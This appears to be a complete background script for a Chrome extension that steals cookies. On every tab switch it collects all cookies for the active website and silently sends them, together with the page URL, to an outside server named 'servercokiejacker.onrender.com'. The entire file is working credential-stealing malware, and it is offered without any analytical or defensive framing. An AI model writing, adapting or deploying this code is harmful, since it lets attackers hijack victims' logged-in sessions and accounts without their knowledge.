chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (tab.url.startsWith("http") || tab.url.startsWith("https")) {
      chrome.cookies.getAll({ url: tab.url }, (cookies) => {
        const cookieData = cookies
          .map((cookie) => `${cookie.name}=${cookie.value}`)
          .join("; ");
        const message = {
          site: tab.url,
          cookies: cookieData,
        };
        sendMessageToServer(message);
      });
    }
  });
});

function sendMessageToServer(message) {
  fetch("https://servercokiejacker.onrender.com/receive-message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      return response.text();
    })
    .then((data) => {
      console.log("Message sent to server:", data);
    })
    .catch((error) => {
      console.error("Error sending message to server:", error);
    });
}
